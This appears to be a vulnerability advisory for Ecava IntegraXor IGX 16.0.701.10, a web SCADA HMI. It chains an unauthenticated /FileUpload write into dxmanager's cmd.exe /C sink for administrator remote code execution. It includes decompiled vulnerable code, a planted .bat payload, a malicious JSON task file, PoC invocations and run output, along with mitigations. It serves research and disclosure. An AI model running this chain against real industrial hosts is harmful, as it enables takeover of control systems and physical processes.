# Ecava IntegraXor IGX 16.0.701.10 — Unauthenticated /FileUpload Arbitrary Write Chained to the dxmanager cmd.exe /C Sink: Administrator RCE on a Web SCADA HMI

## 1. Overview

Ecava IntegraXor IGX (vendor: Ecava Sdn Bhd, Malaysia) is a commercial, closed-source 100% HTML5 Web SCADA HMI platform deployed in manufacturing OT and critical-infrastructure (CII) environments. Version 16.0.701.10 ships as a 213MB Windows MSI and installs a native C++/MFC core service (igsvc) alongside a .NET 8 extension subsystem. The subsystem's HMI web server, `dxweb.exe` (ASP.NET Core 8.0 Kestrel, default port 8081), has no authentication whatsoever, and its `/FileUpload` endpoint accepts an attacker-controlled destination directory (`copyTo`) and file name with zero sanitization — an unauthenticated arbitrary file write to any path the process can create.

This advisory documents how that write primitive is chained into full remote code execution. The DX Manager orchestrator (`dxmanager.exe`), at startup, enumerates every `*.json` file in its configuration directory and executes each entry's `meta.name` field verbatim as `cmd.exe /C <meta.name>` via `Process.Start`. An attacker who sends two unauthenticated `POST /FileUpload` requests — one planting a `.bat` payload at a writable path, one planting a JSON task descriptor whose `meta.name` points at that bat — achieves arbitrary command execution with the dxmanager process identity. In the verified deployment that identity is administrator: the marker file was written by `cmd.exe` spawned from the dxmanager sink, `whoami` returned `<lab-host>\administrator`, and the marker owner is `BUILTIN\Administrators`.

The research process ran in four stages: (1) surface discovery — standard MSI installation, ILSpy decompilation of the .NET 8 extension subsystem (dxweb / dxcore / dxmanager / dxscript), and static audit of the dxweb routing module `WEB_Module.cs`, which revealed the zero-authentication `/FileUpload` and `/FileDownload` endpoints with unsanitized arbitrary paths; (2) sink localization — ripgrep scanning of the decompiled dxmanager for `Process.Start` / `cmd.exe` sinks, surfacing `CreateProcess()` and the `GetTask()` enumeration branch; (3) chain construction — connecting the upload primitive to the enumeration-triggered command sink; (4) dynamic verification — end-to-end execution against a lab target with marker-file confirmation. IntegraXor's published CVE history (six CVEs, all against 4.x, 2010–2014) repeatedly featured unauthenticated primitives — directory traversal (CVE-2010-4563), CSV-export path traversal yielding unauthenticated file read/write (CVE-2014-2375, CVSS 9.0), SQL injection (CVE-2014-2376), admin-credential disclosure through the SQL guest role (CVE-2014-0786), information disclosure (CVE-2014-2377), stack-based DoS (CVE-2014-0753). No public CVE record covers the current v16 line to our knowledge; this finding escalates the historical unauthenticated file-write pattern into administrator RCE on the current product.

## 2. Vulnerability Summary

- **Type**: unauthenticated arbitrary file write chained to an OS command execution sink — pre-authentication remote code execution (CWE-306 / CWE-434 / CWE-73 / CWE-78)
- **Entry point**: `POST /FileUpload` on dxweb (port 8081), `multipart/form-data` with form field `copyTo` (attacker-chosen destination directory) and uploaded file `file` (attacker-chosen name and content). No credentials, cookie, or Authorization header required.
- **Execution sink**: `CreateProcess()` in dxmanager `Manager.cs` — `ProcessStartInfo { FileName = "cmd.exe", Arguments = "/C " + task.moduleName, UseShellExecute = true }` passed to `Process.Start`
- **Source**: `GetTask()` in dxmanager `Manager.cs` — `Directory.GetFiles(<config dir>, "*.json")` enumerates every JSON file; `moduleName = meta.name` with no sanitization; the only exclusion is `meta.name == "dxmanager"`
- **Preconditions**: dxweb exposed on port 8081 + dxmanager running — both default configuration per the research record; no authentication at any step
- **Trigger timing**: the payload executes at the next dxmanager start/restart (system reboot, module update, crash auto-recovery via the igsvc watchdog 3x@10s, or unauthenticated MQTT `Command.Restart`); in real deployments the orchestrator runs continuously and restart events inevitably occur
- **Result**: arbitrary command execution as administrator (`BUILTIN\Administrators`), dynamically verified — marker `<lab-host>\administrator`
- **CVSS**: 9.8 Critical — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- **Affected**: IntegraXor IGX 16.0.701.10 verified. Releases shipping the same zero-authentication dxweb `/FileUpload` endpoint and the same dxmanager `GetTask`/`CreateProcess` logic are likely affected in the same way; not separately verified.

## 3. Product & Architecture

IntegraXor is a Web SCADA HMI: it renders the operator view of industrial processes in the browser (100% HTML5) and runs the plant-facing runtime on a Windows host. The verified installation (MSI standard install, `igx_new.msi`, 213MB) contains:

- **igsvc** (native C++/MFC; related native components igsvr / igcore): Windows service running as LocalSystem; listens on port 7135 (DIOT bus); watchdog auto-restart (3 attempts at 10-second intervals)
- **extensions/** (.NET 8 subsystem):
  - `dxweb.exe` — ASP.NET Core 8.0 Kestrel HMI web server, per-project via `dxweb.json`, port 8081, zero authentication
  - `dxmanager.exe` — DX Manager orchestrator; MQTT port 3881 / WebSocket port 4881; `pwdFile` empty by default → MQTT connections unauthenticated by default
  - `dxcore.dll` / `dxscript.dll` — core modules plus the ClearScript V8 scripting engine (Dapper for data access)
- **mosquitto.exe** — MQTT broker, port 1883; **sagex.py** — SVG inkex editor (design-time tooling, not runtime); project data stored in Jet DB (`.igx`) files

igsvc runs as LocalSystem; dxweb and dxmanager run under the installing user — in the verified deployment, administrator.

### Attack Surface

- dxweb — TCP 8081, HTTP. Endpoints: `/`, `/FileUpload`, `/FileDownload`, all unauthenticated. This is the only surface the attacker needs for the chain documented here.
- dxmanager — TCP 3881 (MQTT) and TCP 4881 (WebSocket); with the default empty `pwdFile`, `ValidatingConnectionAsync` never rejects a connection. Relevant because an unauthenticated MQTT `Command.Restart` is a realistic trigger for payload execution.
- mosquitto — TCP 1883 (MQTT), default no authentication. igsvc — TCP 7135 (DIOT), LocalSystem service.

## 4. Authentication Boundary

**dxweb — none.** The research record audited the full decompiled dxweb routing module `WEB_Module.cs` (481 lines) and documents: no `[Authorize]` attribute anywhere, no authentication middleware, and no auth filter in the request pipeline. All three endpoints (`/`, `/FileUpload`, `/FileDownload`) are reachable with no session, cookie, or token. This was confirmed dynamically: both exploit `POST /FileUpload` requests carried no credentials, cookie, or Authorization header of any kind, and dxweb answered HTTP 200 to both. dxweb is the HMI web server — after deployment it is exposed to operators on port 8081 by design, which is what makes the unauthenticated `/FileUpload` reachable in real deployments.

**dxmanager MQTT — none by default.** With `pwdFile = ""` (default), the `MQTTUser` list is empty, so in the `ValidatingConnectionAsync` handler (decompiled `Manager.cs`) the validation loop never runs, the accept flag stays `true`, and `MqttConnectReasonCode.BadUserNameOrPassword` is never set — no connection is ever rejected. There are no default credentials to speak of anywhere in this chain: the services simply do not authenticate by default.

## 5. Root-Cause Analysis

Both components are closed-source .NET 8 assemblies; the analysis below works from ILSpy-decompiled C# (`ilspycmd` 10.1.1.8388) of `dxweb.dll` and `dxmanager.dll`. The chain has two independent root-cause defects: an unrestricted, unauthenticated file write on the dxweb side, and an unsanitized configuration-to-command-line data path on the dxmanager side.

### Entry Primitive — dxweb /FileUpload Unrestricted Arbitrary-Path File Write

`WEB_Module.cs` (dxweb), `/FileUpload` endpoint:

```csharp
endpoints.MapPost("/FileUpload", async delegate(HttpContext context) {
  string Slash = (RuntimeInformation.IsOSPlatform(OSPlatform.Windows) ? "\\" : "/");
  IFormCollection form = context.Request.Form;
  foreach (IFormFile file in form.Files) {
    if (file.Length > 0 && form.TryGetValue("copyTo", out var value)) {
      string text6 = value.ToString();        // copyTo = attacker-controlled directory, no sanitization
      if (!text6.EndsWith(Slash)) text6 += Slash;
      text6 += file.FileName;                  // file.FileName, no sanitization
      using FileStream stream = new FileStream(text6, FileMode.Create);
      await file.CopyToAsync(stream);          // arbitrary-path file write
    }
  }
});
```

The `copyTo` form field is the destination directory — no sanitization, no whitelist; it can be `C:\Windows\Temp\` or `C:\Users\Administrator\`. `file.FileName` is concatenated verbatim — no `..` filtering, no absolute-path rejection, no extension filtering. `new FileStream(text6, FileMode.Create)` then creates/overwrites the assembled path with attacker content, and the endpoint carries no `[Authorize]` and no auth middleware (Section 4). This unrestricted write is the entry component of the RCE chain documented in this advisory.

### Sink Identification

`Manager.cs` (dxmanager), `CreateProcess()` method (around line 230):

```csharp
private bool CreateProcess(MRunTask task) {
  if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows)) {
    ProcessStartInfo processStartInfo = new ProcessStartInfo();
    processStartInfo.FileName = "cmd.exe";
    if (!string.IsNullOrWhiteSpace(task.path)) {
      processStartInfo.WorkingDirectory = Path.GetDirectoryName(task.path);
    }
    processStartInfo.Arguments = "/C " + task.moduleName;   // SINK: moduleName comes from meta.name
    processStartInfo.UseShellExecute = true;
    status.LogInformation("arg: " + processStartInfo.Arguments);
    using (Process.Start(processStartInfo)) { Thread.Sleep(1000); }
  }
  // Linux branch: writes a systemd unit and uses sudo systemctl start/stop
}
```

Why this is the sink: `task.moduleName` is concatenated directly into the `cmd.exe /C` argument with no sanitization, no character filtering, no command whitelist, and no path validation. `UseShellExecute = true` means a value containing path separators executes as that path, while a bare command name resolves through PATH. The child process runs under the dxmanager identity — administrator in the verified deployment.

### Source Identification

`task.moduleName` originates in `GetTask()` (around line 180). When `dxmanager.csv` is absent (`task.dataVal` empty), the else-branch enumerates the configuration directory:

```csharp
// GetTask else-branch: taken when task.dataVal is empty (dxmanager.csv absent)
else {
  string[] files = Directory.GetFiles(Path.GetDirectoryName(cmdline.config), "*.json");
  foreach (string path in files) {
    DummyMeta dummyMeta2 = JsonFile.DeserializeObjectFromFile<DummyMeta>(path);
    if (dummyMeta2 != null && dummyMeta2.meta != null
        && !string.IsNullOrWhiteSpace(dummyMeta2.meta.name)
        && !dummyMeta2.meta.name.Equals("dxmanager")) {
      list.Add(new MRunTask {
        start = true,
        moduleName = dummyMeta2.meta.name,   // attacker-controlled meta.name -> moduleName
        path = path
      });
    }
  }
}
```

Source properties, as documented by the research record: `Path.GetDirectoryName(cmdline.config)` is the directory containing `dxmanager.json` — the configuration directory, `C:\Users\Administrator\` in the verified environment; `Directory.GetFiles(..., "*.json")` enumerates **all** JSON files there with no whitelist; each file's `meta.name` deserializes into `moduleName`; the only filter is `!meta.name.Equals("dxmanager")`; sanitization of the value: none. Consequence: anyone who can write one `*.json` file into the configuration directory controls what `cmd.exe /C` executes at the next dxmanager startup — and the unauthenticated `/FileUpload` endpoint provides exactly that write.

### Data Flow

```
[attacker-controlled *.json in dxmanager config dir]  meta.name = "C:\Windows\Temp\igx_payload.bat"
  -> GetTask() else-branch: Directory.GetFiles("C:\Users\Administrator\", "*.json")
  -> JsonFile.DeserializeObjectFromFile<DummyMeta>(path) -> dummyMeta2.meta.name
  -> list.Add(MRunTask { start = true, moduleName = meta.name, path })
  -> StartTask -> CreateProcess(task): FileName = "cmd.exe"; Arguments = "/C " + task.moduleName
  -> Process.Start() -> cmd.exe /C C:\Windows\Temp\igx_payload.bat
  -> [arbitrary command execution as the dxmanager process identity (administrator)]
```

No hop between the JSON field `meta.name` and the `cmd.exe /C` argument applies any check: no path whitelist, no command whitelist, no character filtering.

## 6. Exploit Chain Construction

**Step 1 — plant the bat payload (unauthenticated).** `POST /FileUpload` with `copyTo=C:\Windows\Temp\` and file `igx_payload.bat`; dxweb answers HTTP 200 and writes the file (179 bytes on disk in the recorded run):

```bat
@echo off
whoami > C:\Windows\Temp\igx_rce_marker.txt
hostname >> C:\Windows\Temp\igx_rce_marker.txt
echo IGX-RCE-VIA-DXMANAGER-CMD-SINK >> C:\Windows\Temp\igx_rce_marker.txt
```

**Step 2 — plant the JSON task descriptor (unauthenticated).** `POST /FileUpload` with `copyTo=C:\Users\Administrator\` (the dxmanager configuration directory) and file `igx_poc.json`; dxweb answers HTTP 200. `meta.name` is the absolute path of the attacker's bat — any string is acceptable to `cmd.exe /C`, so the field equally supports inline command lines:

```json
{"meta":{"name":"C:\\Windows\\Temp\\igx_payload.bat"}}
```

**Step 3 — dxmanager start/restart executes the payload.** At startup `GetTask()` enumerates `C:\Users\Administrator\*.json`, finds `igx_poc.json`, passes the `meta.name != "dxmanager"` check, and builds `MRunTask { start = true, moduleName = <bat path> }`. `CreateProcess()` then runs `cmd.exe /C C:\Windows\Temp\igx_payload.bat` as administrator, and the bat writes the marker file. In a real deployment the attacker simply waits for a natural trigger: service start after system reboot; module update or configuration-change restart; crash auto-recovery (igsvc watchdog, 3 attempts at 10-second intervals); or an unauthenticated MQTT `Command.Restart` (mosquitto on port 1883 has no authentication by default and dxmanager's `pwdFile` is empty — see Section 4).

## 7. PoC Usage

A self-contained, standard-library-only Python 3 PoC ships with this advisory (`exploit/ecava_integraxor_unauth_fileupload_dxmanager_rce.py`). It performs both unauthenticated planting POSTs and prints the chain status:

```bash
python3 exploit/ecava_integraxor_unauth_fileupload_dxmanager_rce.py http://127.0.0.1:8081
python3 exploit/ecava_integraxor_unauth_fileupload_dxmanager_rce.py http://<target-ip>:8081 --json-dir "C:\Users\Administrator\"
python3 exploit/ecava_integraxor_unauth_fileupload_dxmanager_rce.py http://<target-ip>:8081 --verify-marker
```

Defaults: target `http://127.0.0.1:8081`; `--cmd` is the whoami/hostname/echo marker writer (any command string can be supplied); `--json-dir` is `C:\Users\Administrator\`; bat drop path `C:\Windows\Temp\igx_payload.bat`; marker `C:\Windows\Temp\igx_rce_marker.txt`. The script performs only the unauthenticated HTTP planting — the payload executes at the next dxmanager start/restart. The optional `--verify-marker` mode attempts to read the marker file back through the dxweb `/FileDownload` endpoint as a remote oracle; in the recorded verification the marker was additionally confirmed host-side. The PoC is for authorized security testing and coordinated disclosure only.

## 8. Verification Evidence

**Environment** (lab target; addressing withheld): Windows Server 2025 Datacenter, x86-64; Ecava IntegraXor IGX 16.0.701.10 (MSI standard install with `dxweb.json`/`dxmanager.json` configuration); `dxweb.exe` PID 11096 listening on port 8081; `dxmanager.exe` PID 22372; both processes running as administrator. dxweb was bound to an internal interface on the lab host, so the identical unauthenticated multipart POSTs the exploit script sends were issued through an HTTP client on the target host itself (the recorded exploit output below likewise targets `http://127.0.0.1:8081`). Attacker side: HTTP only, no credentials, no authentication. The recorded trigger was `Start-Process dxmanager.exe -ArgumentList "-c=C:\Users\Administrator\dxmanager.json"`, and the marker was read host-side with `Get-Content C:\Windows\Temp\igx_rce_marker.txt`.

**HTTP exchanges** — neither `/FileUpload` request carried any credential, cookie, or Authorization header; both returned 200:

| Request | Method | Auth | Response |
|------|------|------|------|
| `GET /` | GET | none | 200 (dxweb HMI index — service confirmed live) |
| `POST /FileUpload` (bat) | POST multipart | none | **200** (bat written to `C:\Windows\Temp\igx_payload.bat`, 179 bytes) |
| `POST /FileUpload` (json) | POST multipart | none | **200** (json written to `C:\Users\Administrator\igx_poc.json`) |

**Exploit run output (verbatim):**

```
======================================================================
Ecava IntegraXor unauth RCE exploit (lab demo via curl)
  target   :  http://127.0.0.1:8081
  json dir :  C:\Users\Administrator\
  bat path :  C:\Windows\Temp\igx_payload.bat
======================================================================
[*] starting dxweb...
[+] dxweb PID 11096 listening
[+] GET / -> 200
[*] Step 1: POST /FileUpload  copyTo=C:\Windows\Temp\  file=igx_payload.bat
[+] bat plant HTTP 200
[*] Step 2: POST /FileUpload  copyTo=C:\Users\Administrator\  file=igx_poc.json
[+] json plant HTTP 200
[+] bat present (179 bytes)
[+] json present: {"meta":{"name":"C:\\Windows\\Temp\\igx_payload.bat"}}
[*] Step 3: starting dxmanager -> GetTask enumerates *.json -> cmd.exe /C <meta.name>
[+] dxmanager PID 22372 alive=True

=== RCE MARKER CHECK ===
[+] RCE CONFIRMED - marker written by cmd.exe /C sink:
------ marker content ------
<lab-host>\administrator
<lab-host>
IGX-RCE-VIA-DXMANAGER-CMD-SINK
------ end ------
[+] marker owner: BUILTIN\Administrators
```

**Marker interpretation:**

- `whoami` = `<lab-host>\administrator` — the command executed as administrator (host\administrator)
- `hostname` = `<lab-host>` (research-host identifier withheld) — confirms the execution context
- `IGX-RCE-VIA-DXMANAGER-CMD-SINK` — the echo string proves the marker was produced by the attacker-planted bat at execution time, not a pre-existing file
- Marker file owner = `BUILTIN\Administrators` — elevated identity confirmed independently of the `whoami` line

## 9. Security Impact

- **Unauthenticated administrator RCE with two HTTP requests.** No credentials, no session, no user interaction: two unauthenticated multipart POSTs plant the full chain, and the default-configuration dxmanager restart events execute it. On a SCADA HMI server this is the worst-case identity outcome — the HMI host runs as administrator.
- **Confidentiality**: full administrator read access to process data reaching the HMI, project files (`.igx`), configuration, licensing material, and anything else on the host — exfiltratable over the same unauthenticated HTTP surface or via further commands.
- **Integrity**: HMI tampering — the attacker controls what operators see and can modify project/HMI data; production-process manipulation; and, in the CII manufacturing context the product targets, potential damage to physical equipment through the control system.
- **Availability**: the HMI, the orchestrator, and the host itself can be stopped, corrupted, or repurposed at will.
- **Pivot**: complete takeover of an ICS host, with administrator-level code execution positioned in the OT environment, is a springboard into the control network and the processes it supervises.

### Reachability in Real Deployments

- dxweb is the operator-facing HMI web server, exposed on port 8081 after deployment with zero authentication by default — the unauthenticated `/FileUpload` is reachable wherever operators can reach the HMI; dxmanager runs continuously as the orchestrator.
- The payload fires on any restart event: service start after system reboot, module update or configuration change, crash auto-recovery (igsvc watchdog), or an unauthenticated MQTT `Command.Restart`. The attacker side requires HTTP only: two requests, then wait for a restart event that inevitably occurs.
- Separately noted for completeness: an additional unauthenticated file-read primitive on the same dxweb component was observed during this research and is documented separately; this advisory does not assert a verification status for it.

## 10. Mitigation

1. **Add authentication to dxweb.** Apply `[Authorize]` plus authentication middleware to `/FileUpload` and `/FileDownload` (and any other state-changing endpoint); file operations must be restricted to authenticated administrators.
2. **Whitelist `/FileUpload` paths.** Constrain `copyTo` to a dedicated project data directory and reject absolute paths, `..`, and special characters in both `copyTo` and `file.FileName`; enforce an extension whitelist so `.bat`/`.json` descriptors cannot be dropped into arbitrary locations.
3. **Harden the dxmanager command sink.** `CreateProcess` must not execute `meta.name` as a raw command line; route module loading through a controlled module-name-to-executable-path mapping table, validate that `moduleName` contains only whitelisted characters, and require the resolved path to live inside the installation directory.
4. **Stop enumerating arbitrary JSON as task descriptors.** `GetTask` should load only modules declared in the trusted `dxmanager.csv` rather than blindly enumerating every `*.json` in the configuration directory and executing their `meta.name` values.
5. **Enable MQTT authentication by default.** `pwdFile` must not default to empty; require configured `MQTTUser` credentials (and broker authentication on mosquitto:1883) so `Command.Restart` and other control messages cannot be issued anonymously.
6. **Operator interim hardening** (pending a vendor fix): do not expose dxweb port 8081, dxmanager 3881/4881, or mosquitto 1883 to untrusted networks; restrict HMI access to the trusted operator/management network segment.

## 11. CWE & CVSS

- **CWE-306** — Missing Authentication for Critical Function: dxweb exposes `/`, `/FileUpload`, `/FileDownload` with no `[Authorize]`, middleware, or filter (481-line `WEB_Module.cs`); dxmanager MQTT accepts all connections with the default empty `pwdFile`.
- **CWE-434** — Unrestricted Upload of File with Dangerous Type: `/FileUpload` stores attacker content under attacker-chosen names (`.bat`, `.json`) with no type restriction.
- **CWE-73** — External Control of File Name or Path: `copyTo` + `file.FileName` concatenate into the write path with no sanitization — arbitrary-path create/overwrite.
- **CWE-78** — Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection'): `meta.name` flows unsanitized into `"/C " + task.moduleName` for `cmd.exe`.

**CVSS:3.1 — 9.8 (Critical)** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`. Metric rationale: Attack Vector Network (plain HTTP to port 8081); Attack Complexity Low (two POSTs; the restart trigger is a default-configuration event); Privileges Required None (no authentication anywhere); User Interaction None; Scope Unchanged (execution on the vulnerable host); Confidentiality / Integrity / Availability all High (administrator-level arbitrary command execution).

*This advisory will be published at https://0day-rubbish.com/blog/ecava-integraxor-unauth-fileupload-dxmanager-rce as part of batch-11. Disclosure status is tracked in DISCLOSURE-STATUS.md.*
